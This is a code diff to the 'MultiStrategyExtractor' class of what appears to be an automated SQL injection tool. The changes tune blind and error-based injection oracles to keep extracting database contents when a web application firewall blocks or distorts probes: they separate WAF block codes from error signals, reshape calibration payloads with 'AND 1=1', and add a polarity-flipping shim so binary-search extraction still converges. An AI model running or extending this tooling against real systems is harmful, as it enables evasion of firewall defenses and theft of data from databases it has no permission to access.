@@ -137972,6 +137972,40 @@ class MultiStrategyExtractor:
 
                 if _st_diff or _sz_diff or _body_diff or _hdr_diff:
                     _diff_type = "status" if _st_diff else ("size" if _sz_diff else ("header" if _hdr_diff else "body"))
+                    # BUG-MSE-ERROR-WAF-STATUS-REJECT-FIX (HIGH, all DBMSes):
+                    # When the only diff is "status" AND the error-condition HTTP status
+                    # code is itself a WAF block code (400/403/406/412/429/430/503),
+                    # extraction probes that trigger DB errors will also return that code,
+                    # making them indistinguishable from WAF blocks.  The _eval_error WAF
+                    # guard at line ~138082 then skips all such responses (since
+                    # _err_status_cal in _waf_block_statuses), producing None for every
+                    # True condition → binary search retries → 60s extraction timeout.
+                    # Fix: when diff is purely "status" and err_status is a WAF code,
+                    # check if a distinguishable non-dynamic header was also detected.
+                    # If yes, override diff type to "header" (more discriminating signal).
+                    # If no stable header diff, skip this error method and try the next.
+                    _MSE_WAF_PROBE_CODES = frozenset({400, 403, 406, 412, 429, 430, 503})
+                    _MSE_DYNAMIC_HDR = frozenset({
+                        "x-request-id", "x-trace-id", "x-correlation-id",
+                        "x-request-guid", "x-amz-request-id", "x-amz-id-2",
+                        "x-b3-traceid", "traceid", "x-transaction-id",
+                        "date", "age", "cf-ray",
+                    })
+                    _err_status_is_waf = (_es is not None and _es in _MSE_WAF_PROBE_CODES)
+                    if _diff_type == "status" and _err_status_is_waf:
+                        if _hdr_diff and _hdr_diff_key and _hdr_diff_key.lower() not in _MSE_DYNAMIC_HDR:
+                            # Stable header detected — override to header diff type so
+                            # _eval_error uses header comparison instead of status comparison.
+                            _diff_type = "header"
+                            print(f"[MSE]   err({_name}): err_status={_es} is WAF code — "
+                                  f"overriding to header diff on {_hdr_diff_key!r}", flush=True)
+                        else:
+                            # No stable discriminating signal — skip this error method.
+                            print(f"[MSE]   err({_name}): err_status={_es} is WAF block code "
+                                  f"with no stable header diff — oracle would timeout during "
+                                  f"extraction (True→WAF block→None), skipping", flush=True)
+                            await asyncio.sleep(0.2)
+                            continue
                     print(f"[MSE]   error_oracle({_name}):  diff={_diff_type}", flush=True)
                     self._err_info = {
                         "method": _name, "err_status": _es, "ok_status": _os,
@@ -138071,6 +138105,19 @@ class MultiStrategyExtractor:
             # Also guards against the pathological case where err_status==ok_status
             # (both 400 during calibration): if WAF now returns a different 4xx, skip.
             _waf_block_statuses = {400, 403, 406, 412, 429, 430, 503}
+            _eval_diff = self._err_info.get("diff", "status")
+            _eval_hk   = self._err_info.get("hdr_key", "")
+            _EVAL_DYNAMIC_HDR = frozenset({
+                "x-request-id", "x-trace-id", "x-correlation-id",
+                "x-request-guid", "x-amz-request-id", "x-amz-id-2",
+                "x-b3-traceid", "traceid", "x-transaction-id",
+                "date", "age", "cf-ray",
+            })
+            _using_stable_hdr_eval = (
+                _eval_diff == "header"
+                and _eval_hk
+                and _eval_hk.lower() not in _EVAL_DYNAMIC_HDR
+            )
             # BUG-MSE-EVAL-ERROR-WAF-CAL FIX: the original guard only fired when
             # _fp_status != _err_status_cal.  When calibration itself used a WAF
             # code as the "error" signal (e.g. _err_status_cal=400 because the WAF
@@ -138079,10 +138126,18 @@ class MultiStrategyExtractor:
             # guard never fires → probe is counted as True → oracle returns garbage.
             # Fix: also skip when _err_status_cal is itself a WAF code, because any
             # matching WAF response during extraction is indistinguishable from noise.
-            if (_fp_status in _waf_block_statuses
-                    and (_fp_status != _err_status_cal or _err_status_cal in _waf_block_statuses)
-                    and _fp_status != _ok_status_cal):
-                continue  # WAF blocked the probe — exclude from vote, not a DB signal
+            # BUG-MSE-EVAL-ERROR-HDR-BYPASS-FIX (HIGH): When the error oracle uses
+            # header diff (diff_type overridden from "status" because err_status is a
+            # WAF code), the WAF-block guard must NOT skip based on status alone —
+            # the header is the oracle signal, not the status. A WAF block page may
+            # carry a different header value from the DB-level error page, which is
+            # exactly what the header oracle detects. Skipping on status would discard
+            # all True-condition probes → _votes=[] → None → extraction timeout.
+            if not _using_stable_hdr_eval:
+                if (_fp_status in _waf_block_statuses
+                        and (_fp_status != _err_status_cal or _err_status_cal in _waf_block_statuses)
+                        and _fp_status != _ok_status_cal):
+                    continue  # WAF blocked the probe — exclude from vote, not a DB signal
             _diff = self._err_info["diff"]
             if _diff == "status":
                 _vote = _fp_status == _err_status_cal
@@ -138846,9 +138901,17 @@ class MultiStrategyExtractor:
                     "Informix":        "(1e0 IS NULL)",
                     "SAP_HANA":        "(1e0 IS NULL)",
                 }.get(_bbd_dbms, "1e0 IS NULL")
-                _bbd_fp_t, _ = await self._timed(self._build_inline(_bbd_true_cond))
+                # BUG-BBD-CAL-STRUCT-FIX (HIGH, all DBMSes): Calibration previously
+                # used bare conditions (_bbd_true_cond / _bbd_false_cond) while the
+                # eval function wraps every condition with 'AND 1=1'.  Structurally
+                # different SQL receives different WAF classification → body sizes
+                # measured during calibration differ from body sizes seen during
+                # evaluation → threshold is wrong → polarity inversion at validation.
+                # Fix: wrap calibration probes with '({cond}) AND 1=1' so they match
+                # the exact SQL structure used by _eval_bool_body_diff at eval time.
+                _bbd_fp_t, _ = await self._timed(self._build_inline(f"({_bbd_true_cond}) AND 1=1"))
                 await asyncio.sleep(0.3)
-                _bbd_fp_f, _ = await self._timed(self._build_inline(_bbd_false_cond))
+                _bbd_fp_f, _ = await self._timed(self._build_inline(f"({_bbd_false_cond}) AND 1=1"))
                 _bbd_body_t = len(getattr(_bbd_fp_t, 'body', b'') or b'') if _bbd_fp_t else 0
                 _bbd_body_f = len(getattr(_bbd_fp_f, 'body', b'') or b'') if _bbd_fp_f else 0
                 _bbd_gap = abs(_bbd_body_t - _bbd_body_f)
@@ -139072,52 +139135,64 @@ class MultiStrategyExtractor:
                              "accepting oracle (calibrated at probe time)", name)
                     _validated.append(name)
                     continue
-                if not (r1 and not r2):
-                    # BUG-MSE-VAL-UNIFORM-FIX (HIGH, all DBMSes, all WAF types):
+                # Classify round-1 result and decide whether/how to proceed to Round 2.
+                _r1_uniform = (r1 is not None and r2 is not None and r1 == r2)
+                _r1_pass    = bool(r1 and not r2)
+                _r1_invert  = bool(not r1 and r2)
+                if _r1_uniform:
+                    # BUG-MSE-VAL-UNIFORM-CORRECT-FIX (CRITICAL, all DBMSes, all WAF types):
                     # When both r1 and r2 return the SAME non-None value (both False or
-                    # both True), the WAF is returning a uniform response for all exotic
-                    # validation conditions — the body-size comparison returns the same
-                    # result regardless of SQL truth value.  This happens when a WAF
-                    # that does NOT match fingerprint patterns (no "cloudflare", "blocked"
-                    # etc. text) returns a consistent block page (e.g. 3000B at HTTP 400)
-                    # for both the true and false validation conditions.
-                    # Previously: None+None was accepted (line above); both-same non-None
-                    # fell to "validation FAILED" — oracle discarded even though probe
-                    # phase confirmed it works (gap=237416B).
-                    # Fix: treat uniform non-None result (r1==r2) as WAF-indeterminate,
-                    # same as None+None.  The oracle's functionality is proven by the
-                    # probe-phase gap, not the exotic validation conditions.  Accept it
-                    # rather than discarding a working oracle because WAF blocked the
-                    # ARRAY_LOWER/ISNULL/NVL validation syntax but not the actual
-                    # SUBSTR/ASCII extraction payloads.
-                    if r1 is not None and r2 is not None and r1 == r2:
-                        print(f"[MSE]  {name} validation indeterminate (WAF uniform: "
-                              f"true→{r1}, false→{r2}) — accepting oracle (confirmed at probe time)",
-                              flush=True)
-                        _validated.append(name)
-                        continue
-                    # FIX-BUG4: Detect WAF-corruption: when the WAF returns the same 4xx
-                    # response for every probe (true and false), both r1 and r2 may be True.
-                    # In that case, also probe a third clearly-false condition (2=3) to
-                    # distinguish WAF-uniform (both True: WAF-corrupted) from oracle-inverted
-                    # (r1=False: oracle flipped polarity). WAF-corrupted oracles are unusable
-                    # and blacklisted; genuinely inverted ones are also unusable here but for
-                    # a different reason (polarity needs flip at the call site).
-                    _r3_waf = None
-                    if r2:  # r2 True suggests WAF or oracle corruption
-                        try:
-                            await asyncio.sleep(0.1)
-                            _r3_waf = await asyncio.wait_for(_fn(_mse_val_false), timeout=20)
-                        except Exception:
-                            pass
-                    if r2 and _r3_waf:
-                        print(f"[MSE]  {name} WAF-corrupted (true→{r1}, false→{r2}, false2→{_r3_waf}) — all conditions return True; oracle unusable on this target", flush=True)
-                        # Cache this failure so future MSE instances skip re-probing
-                        if not hasattr(self.config, "_mse_oracle_blacklist"):
-                            self.config._mse_oracle_blacklist = set()
-                        self.config._mse_oracle_blacklist.add(name)
-                    else:
-                        print(f"[MSE]  {name} basic validation FAILED (true→{r1}, false→{r2})", flush=True)
+                    # both True), the WAF returns a uniform response for all exotic
+                    # validation SQL — the oracle cannot distinguish True from False on
+                    # those conditions.  A prior "fix" accepted the oracle immediately
+                    # ("accepting oracle confirmed at probe time"), which caused
+                    # bool_body_diff to always return the same value for every extraction
+                    # probe → binary search always moves in one direction → converges to
+                    # chr(65535) → every extracted position is ' ' garbage.
+                    # (Root cause: WAF silently strips SQL effect or returns uniform block
+                    # page; calibration captured a real signal before WAF adapted; by
+                    # validation time WAF uniformly neutralises all exotic SQL probes.)
+                    # Correct fix: do NOT accept immediately.  Fall through to Round 2
+                    # with real DBMS extraction-style conditions (LENGTH(@@version) etc.).
+                    # If Round 2 shows correct T/F discrimination, the WAF only blocks
+                    # exotic validation SQL while allowing real extraction SQL → accept.
+                    # If Round 2 also returns r3==r4, the existing r3==r4 drop logic
+                    # correctly rejects the oracle as non-functional.
+                    print(f"[MSE]  {name} round-1 WAF-uniform (true→{r1}, false→{r2}) — "
+                          f"verifying with round-2 DBMS conditions before accepting", flush=True)
+                    # fall through to Round 2
+                elif _r1_pass:
+                    # Basic validation passed (r1=True, r2=False) — fall through to Round 2.
+                    pass
+                elif _r1_invert:
+                    # BUG-MSE-POLARITY-INVERT-FIX (HIGH, all DBMSes, all WAF types):
+                    # When r1=False and r2=True the oracle has inverted polarity — it
+                    # returns False for True SQL and True for False SQL.  Root causes:
+                    # (a) _eval_bool_body_diff wraps eval conditions with 'AND 1=1' but
+                    #     calibration used bare exotic conditions — structurally different
+                    #     SQL receives different WAF classification → different body sizes
+                    #     → threshold measured from one SQL shape, oracle fires with another.
+                    # (b) WAF changed caching/routing between calibration and validation,
+                    #     flipping which body size is "large".
+                    # Previously: "basic validation FAILED" and immediate oracle discard,
+                    # causing all boolean extraction to fail silently on affected targets.
+                    # Fix: wrap the eval function with a polarity-inverting shim, register
+                    # it as the canonical function for this oracle name, then fall through
+                    # to Round 2 to verify the flipped oracle produces correct T/F
+                    # discrimination before accepting.
+                    print(f"[MSE]  {name} polarity inverted (true→{r1}, false→{r2}) — "
+                          f"wrapping with polarity-flip shim and re-verifying", flush=True)
+                    _orig_fn_inv = _fn
+                    async def _flipped_eval(cond, _f=_orig_fn_inv):
+                        _res = await _f(cond)
+                        return (not _res) if _res is not None else None
+                    _fn = _flipped_eval
+                    self._oracle_fns[name] = _flipped_eval
+                    # fall through to Round 2 with the polarity-corrected oracle
+                else:
+                    # Mixed None/non-None (one blocked, one evaluable) — indeterminate.
+                    print(f"[MSE]  {name} basic validation indeterminate "
+                          f"(true→{r1}, false→{r2}) — dropping", flush=True)
                     continue
                 # Round 2: real extraction-style condition
                 if self.dbms in ("PostgreSQL", "CockroachDB", "YugabyteDB", "Amazon Redshift"):
@@ -139200,9 +139275,41 @@ class MultiStrategyExtractor:
                 r3 = await asyncio.wait_for(_fn(_real_true), timeout=20)
                 await asyncio.sleep(0.2)
                 r4 = await asyncio.wait_for(_fn(_real_false), timeout=20)
-                if r3 is None or r4 is None:
-                    print(f"[MSE]   {name} real validation got None (true{r3},false{r4})  oracle unreliable", flush=True)
-                    # Add with low confidence  better than nothing
+                if r3 is None and r4 is None:
+                    # BUG-MSE-NONE-NONE-REJECT-FIX (HIGH, error_oracle / all DBMSes):
+                    # When both the always-true and always-false Round-2 probes return None,
+                    # the oracle cannot evaluate any condition at all.  Accepting it produces
+                    # the same "all None" outcome during extraction → eval_condition falls
+                    # through all oracles → retry with backoff → 60s timeout at pos=1.
+                    # Drop instead of accepting with "low confidence" — no confidence is not
+                    # low confidence; it means the oracle is structurally non-functional
+                    # (e.g. error_oracle where err_status=WAF code so guard skips all 400s).
+                    print(f"[MSE]   {name} round-2 both None (true→{r3},false→{r4})  "
+                          "oracle cannot evaluate any condition — dropping", flush=True)
+                elif r3 is None:
+                    # BUG-MSE-TRUE-NONE-REJECT-FIX (HIGH, error_oracle, MySQL / all WAF types):
+                    # When the always-true Round-2 probe returns None but the always-false
+                    # returns a definite value, the oracle cannot evaluate True conditions.
+                    # Binary search requires the oracle to return True for cond≥mid and False
+                    # for cond<mid.  If True conditions always return None, eval_condition
+                    # retries with backoff until timeout → pos=1 timeout at 60s.
+                    # Root cause: error_oracle with err_status=400 (WAF block code) has a
+                    # guard in _eval_error that skips all 400 responses (indistinguishable
+                    # from WAF blocks) → True conditions (div0 error → 400) are always
+                    # skipped → _votes=[] → None.  The False condition (no error → 404)
+                    # evaluates normally.
+                    # Fix: drop the oracle when True conditions are non-evaluable rather
+                    # than accepting and causing extraction timeout.
+                    print(f"[MSE]   {name} round-2 true-cond None (true→{r3},false→{r4})  "
+                          "oracle cannot evaluate True conditions — dropping to prevent "
+                          "extraction timeout", flush=True)
+                elif r4 is None:
+                    # False-condition None is unusual but less catastrophic — binary search
+                    # can still converge if True conditions evaluate correctly.  Accept with
+                    # a note; the oracle may still produce partial results.
+                    print(f"[MSE]   {name} real validation false-cond None (true→{r3},false→{r4})  "
+                          "oracle unreliable (false-eval indeterminate) — accepting with caution",
+                          flush=True)
                     _validated.append(name)
                 elif r3 and not r4:
                     _validated.append(name)
